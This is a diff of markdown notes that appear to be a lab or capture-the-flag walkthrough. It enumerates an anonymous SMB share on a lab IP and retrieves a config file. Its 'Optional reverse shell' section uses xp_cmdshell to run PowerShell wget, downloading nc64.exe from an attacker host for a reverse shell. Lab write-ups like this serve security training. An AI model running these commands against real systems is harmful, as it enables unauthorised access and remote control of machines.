@@ -5,7 +5,7 @@
  ```bash
 #nmap see end
 
-smbclient -N -L \\\\10.129.95.187\\backups
+smbclient -N -L \\\\10.129.95.187\\backups #-N no password -L list shares
 smbclient -N \\\\10.129.95.187\\backups #only open share
 get prod.dtsConfig
 
@@ -46,6 +46,8 @@ b91ccec3305e98240082d4474b848528
 ## Optional reverse shell
 
 ```
+#Find a folder where you have rights to download files
+
 https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc64.exe
 xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.107:88/nc64.exe -outfile .\nc64.exe"
 
